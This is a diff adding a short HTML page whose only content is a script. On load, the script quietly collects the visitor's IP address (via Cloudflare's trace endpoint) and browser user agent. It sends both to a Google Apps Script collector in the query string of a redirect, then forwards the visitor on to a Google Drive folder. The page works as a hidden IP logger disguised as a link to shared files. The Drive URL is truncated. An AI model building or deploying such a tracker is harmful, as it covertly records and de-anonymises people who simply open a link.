@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      fetch("https://www.cloudflare.com/cdn-cgi/trace")
+        .then(res => res.text())
+        .then(txt => {
+          const ip = txt.match(/ip=(.+)/)?.[1] || "不明";
+          const ua = navigator.userAgent;
+          const redirect = "https://script.google.com/macros/s/AKfycby98TX9hCn1Wrw6W2hifvQofuIL1W84QSnR0PsWp4Fc1j3xheyD1KnwLzHdf448J8ZmVA/exec?id=abcd-1234-56-7890-x&ip=" + encodeURIComponent(ip) + "&ua=" + encodeURIComponent(ua) + "&next=https://drive.google.com/drive/folders/1ZarXYuK8urj1vYEqe...";
+          window.location.href = redirect;
+        });
+    </script>
+  </body>
+</html>
